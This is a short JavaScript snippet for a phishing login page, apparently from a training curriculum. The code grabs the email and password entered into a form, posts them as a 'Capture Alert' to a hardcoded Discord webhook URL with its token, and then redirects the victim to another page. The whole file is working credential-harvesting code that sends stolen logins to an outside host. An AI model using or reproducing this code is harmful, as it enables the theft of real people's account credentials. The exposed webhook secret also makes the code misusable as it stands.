// Jonathan, use the webhook LO provided in the curriculum
const WEBHOOK_URL = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";

function handleLogin(event) {
    if(event) event.preventDefault(); // Stops the page from refreshing

    const email = document.getElementById('email-input').value;
    const password = document.getElementById('password-input').value;

    // The Payload: Wrapping the 'captured' data[cite: 4]
    const payload = {
        content: `**Capture Alert!**\n**User:** ${email}\n**Pass:** ${password}`
    };

    // The Fetch: Sending it to your Discord
    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(() => {
        // Redirect once the data is safely in your hands
        window.location.replace("./password.html"); 
    })
    .catch(err => console.error("Data drop failed:", err));
}
